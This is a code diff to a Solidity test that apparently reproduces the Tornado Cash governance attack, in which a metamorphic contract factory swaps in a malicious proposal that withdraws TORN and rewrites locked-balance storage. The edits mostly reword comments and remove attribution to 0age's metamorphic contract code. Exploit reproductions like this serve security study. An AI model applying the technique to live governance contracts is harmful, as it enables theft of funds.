@@ -233,23 +233,19 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
 // using a combination of create2 and create with a transient contract
 // Deployed at tx:
 // https://etherscan.io/tx/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a
-// We use the implementation to reproduce metamorphic contracts made by 0age:
-// https://github.com/0age/metamorphic
+// More reference about this type of contracts could be found at https://github.com/0age/metamorphic
 contract ReinitializableContractFactory is Ownable {
     address public proposal;
     address public transient;
     bool public deployMaliciousProposal;
 
     /**
-     * @dev impl by 0age
      * @dev Modifier to ensure that the first 20 bytes of a submitted salt match
      * those of the calling account. This provides protection against the salt
      * being stolen by frontrunners or other attackers.
      * @param salt bytes32 The salt value to check against the calling address.
      */
     modifier containsCaller(bytes32 salt) {
-        // prevent contract submissions from being stolen from tx.pool by requiring
-        // that the first 20 bytes of the submitted salt match msg.sender.
         require(
             address(bytes20(salt)) == msg.sender,
             "Invalid salt - first 20 bytes of the salt must match calling address."
@@ -359,7 +355,7 @@ contract TransientContract is Ownable {
             proposalContractAddress = address(new Malicious_Proposal_20());
         }
 
-        // ensure that the metamorphic contract was successfully deployed.
+        // ensure that the proposal contract was successfully deployed.
         require(proposalContractAddress != address(0));
         proposal = proposalContractAddress;
     }
@@ -452,8 +448,7 @@ contract Malicious_Proposal_20 is Ownable {
 
         IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);
 
-        // Added asm code to sstore
-        uint256 newVar; // add some provisory var to change the bytecode of this
+        // Added code to sstore over the lockedBalance mapping the new value for the minions
     }
 
     function emergencyStop() public onlyOwner {
